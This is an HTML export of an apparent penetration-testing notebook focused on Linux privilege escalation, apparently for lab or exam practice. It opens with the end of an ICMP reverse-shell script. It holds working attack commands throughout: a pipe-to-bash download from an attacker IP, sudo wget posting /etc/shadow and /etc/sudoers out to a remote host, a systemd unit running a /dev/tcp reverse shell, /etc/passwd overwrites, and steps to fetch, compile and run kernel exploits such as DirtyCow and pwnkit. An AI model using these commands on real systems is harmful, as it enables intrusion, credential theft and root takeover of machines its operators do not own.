ip = ImpactPacket.IP()</p><p>    ip.set_ip_src(src)</p><p>    ip.set_ip_dst(dst)</p><p></p><p>    # Create a new ICMP packet of type ECHO REPLY</p><p>    icmp = ImpactPacket.ICMP()</p><p>    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)</p><p></p><p>    # Instantiate an IP packets decoder</p><p>    decoder = ImpactDecoder.IPDecoder()</p><p></p><p>    while True:</p><p>        cmd = &#39;&#39;</p><p></p><p>        # Wait for incoming replies</p><p>        if sock in select.select([ sock ], [], [])[0]:</p><p>            buff = sock.recv(4096)</p><p></p><p>            if len(buff) == 0:</p><p>                # Socket remotely closed</p><p>                sock.close()</p><p>                sys.exit(0)</p><p></p><p>            # Packet received; decode and display it</p><p>            ippacket = decoder.decode(buff)</p><p>            icmppacket = ippacket.child()</p><p></p><p>            # If the packet matches, report it to the user</p><p>            if (ippacket.get_ip_dst() == src and</p><p>                ippacket.get_ip_src() == dst and</p><p>                8 == icmppacket.get_icmp_type()):</p><p></p><p>                # Get identifier and sequence number</p><p>                ident = icmppacket.get_icmp_id()</p><p>                seq_id = icmppacket.get_icmp_seq()</p><p>                data = icmppacket.get_data_as_string()</p><p></p><p>                if len(data) &gt; 0:</p><p>                    sys.stdout.write(data.decode())</p><p></p><p>                # Parse command from standard input</p><p>                try:</p><p>                    cmd = sys.stdin.readline()</p><p>                except:</p><p>                    pass</p><p></p><p>                if cmd == &#39;exit\n&#39;:</p><p>                    return</p><p></p><p>                # Set sequence number and identifier</p><p>                icmp.set_icmp_id(ident)</p><p>                icmp.set_icmp_seq(seq_id)</p><p></p><p>                # Include the command as data inside the ICMP packet</p><p>                icmp.contains(ImpactPacket.Data(cmd.encode()))</p><p></p><p>                # Calculate its checksum</p><p>                icmp.set_icmp_cksum(0)</p><p>                icmp.auto_checksum = 1</p><p></p><p>                # Have the IP packet contain the ICMP packet (along with its payload)</p><p>                ip.contains(icmp)</p><p></p><p>                # Send it to the target host</p><p>                sock.sendto(ip.get_packet(), (dst, 0))</p><p></p><p>if __name__ == &#39;__main__&#39;:</p><p>    if len(sys.argv) &lt; 3:</p><p>        msg = &#39;missing mandatory options. Execute as root:\n&#39;</p><p>        msg += &#39;./icmpsh-m.py &lt;source IP address&gt; &lt;destination IP address&gt;\n&#39;</p><p>        sys.stderr.write(msg)</p><p>        sys.exit(1)</p><p></p><p>    main(sys.argv[1], sys.argv[2])</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Port_Forwarding__Tunneling--Ligolo__Fastest_speed_960.html"></a><h1 class='title level-4'>Ligolo | Fastest speed</h1><br/><p>Tunnel through networks with Ligolo</p><p></p><p>prep interfaces:</p><p>sudo ip tuntap add user root mode tun ligolo</p><p>sudo ip link set ligolo up</p><p></p><p>kali:</p><p>./proxy -selfcert</p><p>session</p><p>interface_add_route --name ligolo --route 172.28.96.0/20</p><p>start</p><p></p><p>(if you want to get shell from another machine inside the machine you&#39;ve pivoted from. Don&#39;t use kali ip as callback, but use the jumpvox at</p><p>their ip and port 9091. it will forward it to your kali at port 443, where you will catch your shell. If you want to upload files etc, just do the same process with like listener_add --addr 0.0.0.0:9092 --to 127.0.0.1:80 etc)</p><p>listener_add --addr 0.0.0.0:9091 --to 127.0.0.1:443</p><p></p><p>victim:</p><p>./agent -connect 10.8.24.10:11601 -ignore-cert</p><p></p><p>Now you can  route traffic with ligolo and no need for proxychains, making this signifcantly faster.</p><p></p><p>=</p><p>(in heavy restricted environment or docker with stripped away binaries)</p><p></p><p>ways to find route to add:</p><p>cat /proc/net/fib_trie</p><p>cat /proc/net/dev</p><p>cat /proc/net/arp</p><p></p><p></p><p>transfer file when no tools are available like curl wget nc, and fiel transfer with bash etc would corrupt the file hash. do this:</p><p>on kali:</p><p>tar -caf agent.tar.xz agent</p><p>base64 agent.tar.xz &gt; agent.tar.xz.b64</p><p>xclip -sel clip agent.tar.xz.b64<code></code></p><p><code></code></p><p>on victim:</p><p>echo &quot;ENTIRE BASE64 CONTENT YOU COPIED&quot; | base64 -d &gt; agent.tar.xz</p><p>tar -xaf agent.tar.xz</p><p>chmod 777 agent</p><p>./agent</p><p></p><p>&lt;3</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc_23.html"></a><h1 class='title level-3'>Linux Privesc</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology_25.html"></a><h1 class='title level-4'>Methodology</h1><br/><p><a href="https://0xy37.medium.com/linux-pe-cheatsheet-oscp-prep-9affaebd0f0e">https://0xy37.medium.com/linux-pe-cheatsheet-oscp-prep-9affaebd0f0e</a></p><p></p><p><a href="https://github.com/MattiaCossu/PE-Linux?tab=readme-ov-file#org6d2022e">https://github.com/MattiaCossu/PE-Linux?tab=readme-ov-file#org6d2022e</a></p><p></p><p><ul><li>LinPeas: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></li><li>LinEnum: <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li><li>LES (Linux Exploit Suggester): <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li><li>Linux Smart Enumeration: <a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li><li>Linux Priv Checker: <a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a></li></ul></p><p></p><p></p><p><span style="color:#234141;">Check for all the exploits in the exploit section and the manual enumeration too if needed.</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">Take good notes as well.</span></p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Enum_cheatsheet_342.html"></a><h1 class='title level-5'>Enum cheatsheet</h1><br/><p></p><p><h2>Fast Mass Enum</h2></p><p></p><p>shell stabilization (pretty colors :))</p><p>cat /etc/shells</p><p></p><p>PS1=&#39;\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$ &#39;</p><p></p><p></p><p>echo &quot;Useful tools:&quot;; missing=&quot;&quot;; for i in kubectl hostname perl python python3 dpkg bash sh yq jq nmap curl wget ping apt apk openssl nc netcat sed vim vi nano base64 tar; do command -v &quot;$i&quot; &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo &quot;$i&quot; || missing=&quot;$missing $i&quot;; done; if [ -n &quot;$missing&quot; ]; then echo  &quot;Missing tools: $(echo &quot;$missing&quot; | sort)&quot;; fi</p><p></p><p><span style="color:#3f4043;">Stabilize shell:</span></p><p>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</p><p><span style="color:#3f4043;">or</span></p><p>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</p><p><span style="color:#3f4043;">( then ctrl + z to background process)</span></p><p>stty -a</p><p>stty raw -echo; fg</p><p><span style="color:#3f4043;">this sets it on the box ur going into:</span></p><p>stty rows 29 cols 237</p><p>export TERM=xterm-256color</p><p><span style="color:#3f4043;">(if u wanna set the rows etc)</span></p><p><span style="color:#3f4043;">this checks ur rows and columns in ur current shell:</span></p><p></p><p>curl 10.13.4.2/stab.sh | bash</p><p><span style="color:#3f4043;">Grab all enum files:</span></p><p>wget -nH -r 10.13.31.108 &amp;&amp; rm index.html</p><p></p><p><span style="color:#3f4043;">Give all execution permission:</span></p><p>chmod +x *.sh</p><p></p><p><span style="color:#3f4043;">Mass enum oneliner:</span></p><p>/tmp/test/linpeas.sh | tee linpeas.log &amp;&amp; /tmp/test/lse.sh -i | tee lse.log</p><p></p><p><span style="color:#3f4043;">Go through all output:</span></p><p>cat *.log</p><p>less -R *.log</p><p></p><p><h2>Manual Quick Wins</h2></p><p></p><p><span style="color:#3f4043;">See what current user has sudo permission for:</span></p><p>sudo -l</p><p></p><p><span style="color:#3f4043;">Check for kernel exploits:</span></p><p>uname -sr</p><p>lsb_release -a</p><p></p><p><span style="color:#3f4043;">Finds binaries with SUID or SGID bitsets:</span></p><p>find / -type f -perm -04000 -ls 2&gt;/dev/null</p><p>strings /usr/sbin/exim4</p><p><span style="color:#3f4043;">(Use searchsploit and</span> <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> <span style="color:#3f4043;">on results)</span></p><p></p><p><span style="color:#3f4043;">Check cronjobs:</span></p><p>cat /etc/crontab</p><p>ls /etc/cron*</p><p>cat /etc/cron*</p><p>cat /etc/cron.d</p><p>cat /var/spool/cron/*</p><p></p><p><span style="color:#3f4043;">Check processes running:</span></p><p>ps aux | grep root</p><p>./pspy64</p><p></p><p><span style="color:#3f4043;">Check open internal ports:</span></p><p>ss -lntu</p><p>ss -ltu</p><p></p><p><span style="color:#3f4043;">Check files owned by group:</span></p><p>groups</p><p>find / -group uwu 2&gt;/dev/null</p><p>find / -writable -type d -group gods 2&gt;/dev/null</p><p>find / -writable -type f -group gods 2&gt;/dev/null</p><p></p><p><span style="color:#3f4043;">Check files owned by user:</span></p><p>id</p><p>find / -writable -type d -user hades 2&gt;/dev/null</p><p>find / -writable -type f -user hades 2&gt;/dev/null</p><p></p><p><span style="color:#3f4043;">Check enabled capabilities:</span></p><p>getcap -r / 2&gt;/dev/null</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Manual_Enumeration_148.html"></a><h1 class='title level-5'>Manual Enumeration</h1><br/><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p>Manual Enumeration:</p><p>(Keep in mind manual enumeration tends to be more stealthy)</p><p>Useful to start with:</p><p></p><p></p><p><span style="color:#237522;">systeminfo and general</span></p><p>hostnamectl</p><p>whoami</p><p>id</p><p>uname -a</p><p>sudo -l</p><p>history</p><p>dpkg -l | grep logrotate</p><p></p><p><span style="color:#237522;">Networking</span></p><p>ss -ltu</p><p>ss -lntu</p><p>netstat -antop</p><p>ifconfig</p><p>ip route</p><p>-----</p><p><span style="color:#237522;">OS info:</span></p><p>uname -a</p><p>cat /etc/issue</p><p>cat /proc/version</p><p></p><p>ps (view running processes)</p><p>ps -A (see all running processes)</p><p>ps axjf (see full process tree)</p><p>ps aux (will show processes for all users, and who&#39;s running them)</p><p></p><p>env (This command will show environmental variables.)</p><p>-----------------</p><p><span style="color:#3f4043;">upgrading shell more:</span></p><p><span style="color:#071ba3;">DONT USE RLWRAP WHEN DOING THIS</span></p><p></p><p></p><p>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</p><p>or</p><p>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</p><p></p><p>export TERM=xterm-color</p><p></p><p>( then ctrl + z to background process)</p><p></p><p>stty raw -echo; fg</p><p>-----------------</p><p>cat /etc/passwd | grep home </p><p>(to find all actual users. As some of which are system orservice users that would not be very useful)</p><p></p><p>: Find world-writeablefolders</p><p><code>find / -writable -type d 2&gt;/dev/null</code> </p><p></p><p>will list files that have SUID or SGID bits set.</p><p><code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code> </p><p></p><p>will list files with all permissions</p><p>find / -type f -perm 0777</p><p></p><p>find enabled capabilities:</p><p>getcap -r / 2&gt;/dev/null</p><p></p><p>see running cron jobs:</p><p>cat /etc/crontab</p><p></p><p>see network shares:</p><p>showmount -e 10.10.28.220</p><p>cat /etc/exports</p><p><img src="images/148-1.png" alt="images/148-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Containers_623.html"></a><h1 class='title level-5'>Containers</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Containers--Docker_628.html"></a><h1 class='title level-6'>Docker</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Containers--Docker--Docker_generaluse_cheat_sheet_626.html"></a><h1 class='title level-7'>Docker generaluse cheat sheet</h1><br/><p><a href="https://dockerlabs.collabnix.com/docker/cheatsheet/">https://dockerlabs.collabnix.com/docker/cheatsheet/</a></p><p></p><p><a href="https://raw.githubusercontent.com/sangam14/dockercheatsheets/master/dockercheatsheet8.png"><img src="images/626-1.png" alt="images/626-1.png" /></a></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Containers--Docker--Docker_Attacks_627.html"></a><h1 class='title level-7'>Docker Attacks</h1><br/><p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation</a></p><p><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</a></p><p><a href="https://tbhaxor.com/container-breakout-part-1/">https://tbhaxor.com/container-breakout-part-1/</a></p><p></p><p><span style="color:#3f4043;">Super helpful:</span></p><p><a href="https://www.youtube.com/watch?v=ZbHVRoWEwA8">https://www.youtube.com/watch?v=ZbHVRoWEwA8</a></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Containers--Kubernetes_629.html"></a><h1 class='title level-6'>Kubernetes</h1><br/><p><span style="color:#3f4043;">Practice:</span></p><p><a href="https://github.com/madhuakula/kubernetes-goat">https://github.com/madhuakula/kubernetes-goat</a></p><p><a href="https://www.youtube.com/watch?v=YFCOvPVa5co">https://www.youtube.com/watch?v=YFCOvPVa5co</a></p><p></p><p><span style="color:#3f4043;">Tools:</span></p><p><a href="https://github.com/aquasecurity/kube-hunter">https://github.com/aquasecurity/kube-hunter</a></p><p><a href="https://github.com/falcosecurity/falco">https://github.com/falcosecurity/falco</a> <span style="color:#3f4043;">(cloud runtime security tool)</span></p><p></p><p><span style="color:#3f4043;">Pod/Container Escape via privileged pod:</span></p><p>kubectl run r00t --restart=Never -ti --rm --image lol --overrides &#39;{&quot;spec&quot;:{&quot;hostPID&quot;: true, &quot;containers&quot;:[{&quot;name&quot;:&quot;1&quot;,&quot;image&quot;:&quot;alpine&quot;,&quot;command&quot;:[&quot;nsenter&quot;,&quot;--mount=/proc/1/ns/mnt&quot;,&quot;--&quot;,&quot;/bin/bash&quot;],&quot;stdin&quot;: true,&quot;tty&quot;:true,&quot;securityContext&quot;:{&quot;privileged&quot;:true}}]}}&#39;</p><p></p><p></p><p><a href="https://kubenomicon.com/Kubenomicon.html">https://kubenomicon.com/Kubenomicon.html</a></p><p></p><p><a href="https://youtu.be/JMTMEEqaBKg?t=4344">https://youtu.be/JMTMEEqaBKg?t=4344</a></p><p></p><p>Video walkthorugh of kubernetes basics and attacks.</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks_80.html"></a><h1 class='title level-5'>Attacks</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Common_Kernel_Exploits_81.html"></a><h1 class='title level-6'>Common Kernel Exploits</h1><br/><p><span style="color:#234141;">Simple example:</span></p><p></p><p>uname -a <span style="color:#234141;">to find kernel version. See if any exploits out there.</span></p><p></p><p><span style="color:#234141;">In this case I found</span> <a href="https://www.exploit-db.com/exploits/37292">https://www.exploit-db.com/exploits/37292</a> <span style="color:#234141;">this one but had to compile it using &quot;gcc &lt;filename&gt; -o outputname</span></p><p></p><p><span style="color:#234141;">then simply host up quick webserver </span></p><p>python -m SimpleHTTPServer 8000</p><p><span style="color:#234141;">or</span></p><p>python3 -m http.server 8000</p><p></p><p><span style="color:#234141;">go into tmp directory on victim or anywhere you can get uploads to.</span></p><p></p><p><span style="color:#234141;">then from vimtim machine run:</span></p><p>wget 10.9.3.155:8000/&lt;nameofexploit&gt;</p><p><span style="color:#234141;">then</span></p><p>chmod +x nameofexploit    to give execution rights</p><p></p><p>./exploit</p><p># id</p><p>uid=0(root) gid=0(root) groups=0(root),1001(karen)</p><p></p><p></p><p><span style="color:#234141;">:)</span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Common_Kernel_Exploits--cow__2.6__3.9_358.html"></a><h1 class='title level-7'>cow  2.6 < 3.9</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Common_Kernel_Exploits--cow__2.6__3.9--DirtyCow_279.html"></a><h1 class='title level-8'>DirtyCow</h1><br/><p>wget <a href="https://www.exploit-db.com/download/40611">https://www.exploit-db.com/download/40611</a></p><p></p><p><span style="color:#3f4043;">Rename:</span></p><p>mv 40611 dirtyc0w.c</p><p></p><p><span style="color:#3f4043;">Compile with:</span></p><p>gcc -pthread dirtyc0w.c -o dirtyc0w</p><p></p><p><span style="color:#3f4043;">Execute:</span></p><p>./dirtyc0w foo m00000000000000000</p><p></p><p>cat /etc/passwd</p><p></p><p>su new</p><p>123</p><p></p><p></p><p>root</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Common_Kernel_Exploits--cow__2.6__3.9--DirtyCow2_266.html"></a><h1 class='title level-8'>DirtyCow2</h1><br/><p></p><p><a href="https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c">https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c</a></p><p><span style="color:#3f4043;">Quick howto usage of exploit: (If that doesn&#39;t work, see below for potential issues)</span></p><p></p><p>/<span style="color:#3f4043;">/ Compile with:</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">//   </span>gcc -pthread dirty.c -o dirty -lcrypt<span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">//</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">// Then run the newly create binary by either doing:</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">//   </span>&quot;./dirty&quot; or &quot;./dirty my-new-password&quot;<span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">//</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">// Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">//</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">// DON&#39;T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">//   </span>mv /tmp/passwd.bak /etc/passwd</p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</p><p></p><p>export TERM=xterm-color</p><p></p><p>( then ctrl + z to background process)</p><p></p><p>stty raw -echo; fg</p><p></p><p>I run linpeas and I see dirty cow 2 is high probabiltiy of being exploitable for privesc!</p><p></p><p><img src="images/266-1.png" alt="images/266-1.png" /></p><p></p><p>I attempt this:</p><p></p><p><img src="images/266-2.png" alt="images/266-2.png" /></p><p></p><p>We see that it&#39;s trying to execute ‘cc1’ as a port of it&#39;s compiling process. Let&#39;s try to locate and potentially fix this error.</p><p></p><p>  <img src="images/266-3.png" alt="images/266-3.png" /></p><p>  </p><p>  It&#39;s on the machine, so it&#39;s likely a path variable mistake then.</p><p>  </p><p>  Let&#39;s attempt this:</p><p>  </p><p>  <img src="images/266-4.png" alt="images/266-4.png" /></p><p>  </p><p>  And it now works! Including the binary the exploit it depends on to our path sure is helpful!</p><p>  </p><p>  It&#39;s now adding firefart as a user overwriting root and using the password we just set.</p><p>  </p><p>  We can now ssh into firefart with the password we set.</p><p>  </p><p><img src="images/266-5.png" alt="images/266-5.png" /></p><p></p><p>  </p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Common_Kernel_Exploits--2.6.9-89.EL_308.html"></a><h1 class='title level-7'>2.6.9-89.EL</h1><br/><p>wget <a href="https://github.com/xiaoxiaoleo/CVE-2009-2698/raw/master/exp">https://github.com/xiaoxiaoleo/CVE-2009-2698/raw/master/exp</a></p><p></p><p><span style="color:#3f4043;">This one worked well on this kernel version. </span></p><p></p><p><span style="color:#3f4043;">It&#39;s pre-compiled. </span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Common_Kernel_Exploits--pwnkit_314.html"></a><h1 class='title level-7'>pwnkit</h1><br/><p><h2>PWNKIT | CVE-2021-4034</h2></p><p></p><p><a href="https://github.com/arthepsy/CVE-2021-4034">https://github.com/arthepsy/CVE-2021-4034</a></p><p></p><p>wget <a href="https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c">https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c</a></p><p></p><p>gcc cve-2021-4034-poc.c -o cve-2021-4034-poc</p><p></p><p></p><p><span style="color:#3f4043;">transfer, exploit</span></p><p>chmod +x cve-2021-4034-poc</p><p>./cve-2021-4034-poc</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Common_Kernel_Exploits--4.4__cve-2017-16995_319.html"></a><h1 class='title level-7'>4.4 | cve-2017-16995</h1><br/><p><a href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a></p><p><span style="color:#3f4043;">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation</span></p><p></p><p><span style="color:#3f4043;">Machine I tested it on:</span></p><p>uname -a</p><p><span style="color:#3f4043;">Linux dotty 4.4.0-116-generic #140-Ubuntu</span></p><p></p><p>wget <a href="https://www.exploit-db.com/raw/45010">https://www.exploit-db.com/raw/45010</a></p><p>mv 45010 cve-2017-16995.c</p><p>gcc cve-2017-16995.c -o cve-2017-16995</p><p></p><p><span style="color:#3f4043;">transfer, permit access, and execute</span></p><p><img src="images/319-1.png" alt="images/319-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Common_Kernel_Exploits--DirtyCred_416.html"></a><h1 class='title level-7'>DirtyCred</h1><br/><p>DirtyCred: <a href="https://github.com/Markakd/CVE-2021-4154#cve-2021-4154">https://github.com/Markakd/CVE-2021-4154#cve-2021-4154</a></p><p></p><p>This exploit works on most Centos 8 kernels higher than linux-4.18.0-305.el8 and most buntu 20 kernels higher than 5.4.0-87.98 and 5.11.0-37.41.</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Sudo_Access_82.html"></a><h1 class='title level-6'>Sudo Access</h1><br/><p>simplest way:</p><p></p><p>sudo -l </p><p>go to <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p>exploit</p><p></p><p>:)</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Sudo_Access--Sudo_+_LD_PRELOAD_83.html"></a><h1 class='title level-7'>Sudo + LD_PRELOAD</h1><br/><p><a href="https://www.youtube.com/watch?v=bzjnIi5u9OQ">https://www.youtube.com/watch?v=bzjnIi5u9OQ</a></p><p></p><p><a href="https://c0nd4.medium.com/linux-sudo-ld-preload-privilege-escalation-7e1e17d544ec">https://c0nd4.medium.com/linux-sudo-ld-preload-privilege-escalation-7e1e17d544ec</a></p><p></p><p>sudo -l </p><p></p><p>cat /etc/sudoers</p><p></p><p>follow rest of guide</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Sudo_Access--wget_232.html"></a><h1 class='title level-7'>wget</h1><br/><p><a href="https://rootrecipe.medium.com/unique-priv-esc-methods-3a11d9dc94f">https://rootrecipe.medium.com/unique-priv-esc-methods-3a11d9dc94f</a></p><p></p><p><span style="color:#3f4043;">Shadow technique:</span></p><p></p><p>sudo wget --post-file=/etc/shadow 10.10.10.99</p><p></p><p>rlwrap nc -lvnp 80</p><p></p><p><span style="color:#3f4043;">(then we receive the shadow file and might be able to crack it for the user to sudo su or to another user)</span></p><p></p><p></p><p></p><p></p><p><span style="color:#3f4043;">Sudoers</span> <span style="color:#3f4043;">technique</span>:</p><p></p><p>sudo wget --post-file=/etc/sudoers 10.10.10.99</p><p><span style="color:#3f4043;"># Edit the file so the user we are imitading has (root) NOPASSWD: ALL permissions</span></p><p><span style="color:#3f4043;"># Download the file back to the target machine and it&#39;ll overwrite the original sudoers file:</span></p><p>sudo wget 10.10.10.99/modified_sudoers --output-docuemtn=/etc/sudoers</p><p><span style="color:#3f4043;"># Run &quot;sudo su&quot; to get root</span></p><p>sudo su</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Sudo_Access--vi_367.html"></a><h1 class='title level-7'>vi</h1><br/><p>sudo vi</p><p></p><p>:!sh</p><p></p><p>root</p><p></p><p>(:qa or :wq) to quit</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Sudo_Access--sudo_commands_as_different_user_438.html"></a><h1 class='title level-7'>sudo commands as different user</h1><br/><p>sudo -u michael /opt/backups/backup.sh</p><p></p><p>sudo -u</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--SUID_binaries_84.html"></a><h1 class='title level-6'>SUID binaries</h1><br/><p><span style="color:#234141;">run this. see what processes has scary SUID binaries set on them </span><span style="background-color:#000000;"></span></p><p><span style="background-color:#000000;">find / -type f -perm -04000 -ls 2&gt;/dev/null</span><span style="background-color:#000000;"></span></p><p><span style="background-color:#000000;"></span><span style="background-color:#000000;"></span></p><p><span style="background-color:#000000;"></span><span style="background-color:#000000;"></span></p><p><span style="background-color:#000000;"></span><span style="color:#234141;">secondly, go to </span>https://gtfobins.github.io/#+suid <span style="color:#234141;">and go down the list and see what processes potentially match with victim machine. You might find some juice privesc binary to use</span><span style="background-color:#000000;"></span></p><p><span style="background-color:#000000;"></span><span style="background-color:#000000;"></span></p><p><span style="background-color:#000000;"></span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--SUID_binaries--cp_310.html"></a><h1 class='title level-7'>cp</h1><br/><p>cat /etc/passwd</p><p></p><p>openssl passwd dog</p><p><span style="color:#3f4043;">MbmNyoQmTL7Tg</span></p><p></p><p>add that one in there over root instead of the x. like so:</p><p><img src="images/310-1.png" alt="images/310-1.png" /></p><p></p><p><span style="color:#3f4043;">have a copy of original /etc/passwd in your directory.</span></p><p></p><p><span style="color:#3f4043;">then do</span></p><p>cp passwd /etc/passwd</p><p><span style="color:#3f4043;">(overwrites it due to SUID binaries on cp)</span></p><p>su root</p><p>dog</p><p></p><p><img src="images/310-2.png" alt="images/310-2.png" /></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--SUID_binaries--setcap_370.html"></a><h1 class='title level-7'>setcap</h1><br/><p><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/">https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/</a></p><p></p><p>find / -type f -perm -04000 -ls 2&gt;/dev/null</p><p><img src="images/370-1.png" alt="images/370-1.png" /></p><p></p><p></p><p>cd /tmp</p><p>whereis python3</p><p>cp /usr/bin/python3 .</p><p>setcap cap_setuid+ep python3</p><p>./python3 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;</p><p></p><p></p><p></p><p><img src="images/370-2.png" alt="images/370-2.png" /></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--SUID_binaries--systemctl_683.html"></a><h1 class='title level-7'>systemctl</h1><br/><p>cd /dev/shm</p><p>gedit root.service</p><p></p><p><div class="codebox"><pre>[Unit]<br /><span style="color:#7f0044;font-weight:400">Description</span>=roooooooooot<br /><br />[Service]<br /><span style="color:#7f0044;font-weight:400">Type</span>=simple<br /><span style="color:#7f0044;font-weight:400">User</span>=root<br /><span style="color:#7f0044;font-weight:400">ExecStart</span>=<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>bash -c <span style="color:#3ad900;font-weight:400">&#39;bash -i &gt;&amp; /dev/tcp/10.10.23.42/443 0&gt;&amp;1&#39;</span><br /><br />[Install]<br /><span style="color:#7f0044;font-weight:400">WantedBy</span>=multi-user.target</pre></div></p><p></p><p></p><p></p><p><h4>nc -lvnp </h4>443</p><p></p><p>/bin/systemctl enable /dev/shm/root.service</p><p><span style="color:#3f4043;">Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /dev/shm/root.service</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">Created symlink from /etc/systemd/system/root.service -&gt; /dev/shm/root.service</span></p><p></p><p>/bin/systemctl start root</p><p></p><p></p><p><span style="color:#3f4043;">Root :)</span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--SUID_binaries--environment_variable_741.html"></a><h1 class='title level-7'>environment variable</h1><br/><p>tryhackme blog</p><p></p><p><span style="color:#3f4043;">This gives you more info on binary, can see env it uses for isntance</span></p><p>ltrace /usr/sbin/checker</p><p></p><p>export admin=1</p><p></p><p><span style="color:#3f4043;">run</span></p><p>/usr/sbin/checker</p><p><span style="color:#3f4043;">root :)</span></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Capabilities_85.html"></a><h1 class='title level-6'>Capabilities</h1><br/><p><a href="https://gtfobins.github.io/#+capabilities">https://gtfobins.github.io/#+capabilities</a></p><p></p><p></p><p><span style="color:#234141;">Used to list enabled capabilities, and we&#39;re using 